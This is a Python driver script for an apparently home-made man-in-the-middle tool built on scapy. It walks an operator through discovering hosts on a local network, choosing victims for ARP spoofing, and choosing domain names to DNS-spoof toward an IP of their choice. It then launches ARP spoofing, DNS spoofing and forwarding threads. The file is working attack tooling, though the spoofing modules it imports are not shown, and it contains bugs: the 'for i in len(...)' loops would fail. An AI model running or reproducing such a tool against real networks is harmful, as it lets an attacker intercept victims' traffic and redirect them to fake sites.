from src import arp_spoof as arp
from src import dns_spoof as dns
from src import discover_active
from src import discover_passive
from src import forward as fwd
from scapy.arch import get_if_list

hosts = dict()
discover_threads = dict()

if __name__ == '__main__':
    available_interfaces = get_if_list()
    print(f"The following interfaces were found: {available_interfaces}")
    print("Please type the names of the interfaces you want to discover hosts on, "
          "type 'done' once all desired interfaces have been input.")
    chosen_interfaces = list()
    while True:
        user_input = input("Name of interface to discover on, or 'done' once finished:\n")
        if user_input in available_interfaces:
            if user_input not in chosen_interfaces:
                chosen_interfaces.append(user_input)
                print(f"Currently selected interfaces: {chosen_interfaces}")
            else:
                print("This interface has already been selected")
        elif user_input == "all":
            chosen_interfaces = available_interfaces
            print(f"Currently selected interfaces: {chosen_interfaces}")
            break
        elif user_input == "done":
            break
        else:
            print("The name you gave does not match any of the available interfaces")

    print("Do you want to actively discover on any of the selected interfaces? "
          "This will generate large amounts of traffic as every possible IP address "
          "in the subnet will be pinged.")
    active_discover_interfaces = list()
    while True:
        user_input = input("[y/n]\n")
        if user_input == "y" or user_input == "n":
            break

    if user_input == "y":
        while True:
            user_input = input("Name of interface to actively discover on, or 'done' once finished:\n")
            if user_input in chosen_interfaces:
                if user_input not in active_discover_interfaces:
                    active_discover_interfaces.append(user_input)
                    print(f"Currently selected interfaces: {active_discover_interfaces}")
                else:
                    print("This interface has already been selected")
            elif user_input == "all":
                active_discover_interfaces = chosen_interfaces
                print(f"Currently selected interfaces: {active_discover_interfaces}")
                break
            elif user_input == "done":
                break
            else:
                print("The name you gave does not match any of the chosen interfaces")

    print(f"Now starting discovery...  press [ENTER] once the desired hosts have been discovered.")
    for interface in chosen_interfaces:
        hosts[interface] = dict()
        discover_threads[interface] = discover_passive.Discover(hosts, interface)
        discover_threads[interface].start()
        if interface in active_discover_interfaces:
            discover_active.discover(interface)
    input()
    for interface in chosen_interfaces:
        discover_threads[interface].stop()

    print("Hosts discovered:")
    for interface in hosts:
        print(f"{interface}")
        for mac in hosts[interface]:
            for ip in hosts[interface][mac]:
                print(f"  {mac}  -  {ip}")

    print("Please type the name of the interface on which the hosts you want to ARP were found")
    while True:
        user_input = input()
        if user_input in hosts:
            arp_spoof_victim_if = user_input
            break
        else:
            print("This is not an interface on which hosts were discovered, please type another name.")

    print("Please select the hosts you want to ARP spoof")
    arp_spoof_victim_macs = list()
    arp_spoof_victim_ips = list()
    while True:
        print("Please type the MAC address corresponding to a host you want to ARP spoof")
        while True:
            user_input = input()
            if user_input in hosts[arp_spoof_victim_if]:
                arp_spoof_victim_mac = user_input
                arp_spoof_victim_macs.append(arp_spoof_victim_mac)
                break
            else:
                print("This is not a MAC address that was found, please type another MAC address.")

        if len(hosts[arp_spoof_victim_if][arp_spoof_victim_mac]) == 1:
            arp_spoof_victim_ip = hosts[arp_spoof_victim_if][arp_spoof_victim_mac][0]
            arp_spoof_victim_ips.append(arp_spoof_victim_ip)
        else:
            print(f"Please type the IP address corresponding to the mac address {arp_spoof_victim_mac}"
                  f" the host you want to ARP spoof")
            while True:
                user_input = input()
                if user_input in hosts[arp_spoof_victim_if][arp_spoof_victim_mac]:
                    arp_spoof_victim_ip = user_input
                    arp_spoof_victim_ips.append(arp_spoof_victim_ip)
                    break
                else:
                    print("This is not an IP address that was found, please type another IP address.")

        print("Do you want to spoof another host?")
        user_input = input("[y/n]\n")
        if user_input == "y":
            pass
        elif len(arp_spoof_victim_ips) < 2:
            print("You should spoof at least two hosts in order to perform a man in the middle attack")
        else:
            print("Host that will be spoofed:")
            for i in len(arp_spoof_victim_ips):
                print(f"{arp_spoof_victim_macs[i]}  -  {arp_spoof_victim_ips[i]}")
            break

    print("Please type the domain names you want to DNS spoof for the victim, "
          "type 'done' once all domain names have been input.")
    spoofed_domain_names = list()
    while True:
        user_input = input("Domain name that will be spoofed:\n")
        if user_input in spoofed_domain_names:
            print("This domain name is already in the list of domains that will be spoofed.")
        elif user_input == "done":
            break
        else:
            spoofed_domain_names.append(user_input)
            print(f"domain names that will be spoofed: {spoofed_domain_names}")

    while True:
        print("Please type the IP to which the spoofed domain names should be redirected:")
        user_input = input()
        redirect_ip = user_input
        print(f"Are you sure you want to redirect the spoofed host to {redirect_ip}?")
        user_input = input("[y/n]\n")

        if user_input == "y":
            break
        else:
            pass

    input("Setup ready, press [ENTER] to start ARP and DNS spoofing.")
    arp_spoofing = list()
    for i in len(arp_spoof_victim_ips):
        arp_spoofing.append(arp.ARPSpoofing(
            interface=arp_spoof_victim_if,
            target_mac=arp_spoof_victim_macs[i],
            target_ip=arp_spoof_victim_ips[i],
            spoofed_ips=arp_spoof_victim_ips,
            hosts=hosts,
            delay=3
        ))
    dns_spoofing = dns.DNSSpoofing(
        interface=arp_spoof_victim_if,
        domain_names=spoofed_domain_names,
        victims=arp_spoof_victim_ips,
        redirect_ip=redirect_ip
    )
    forwarding = fwd.Forwarding(
        interface=arp_spoof_victim_if,
        hosts=hosts,
        domain_names=spoofed_domain_names
    )
    for arp_spoof_thread in arp_spoofing:
        arp_spoof_thread.start()
    dns_spoofing.start()
    forwarding.start()

    input("Press [enter] to stop DNS and ARP spoofing")
    for arp_spoof_thread in arp_spoofing:
        arp_spoof_thread.stop()
    dns_spoofing.stop()
    forwarding.stop()
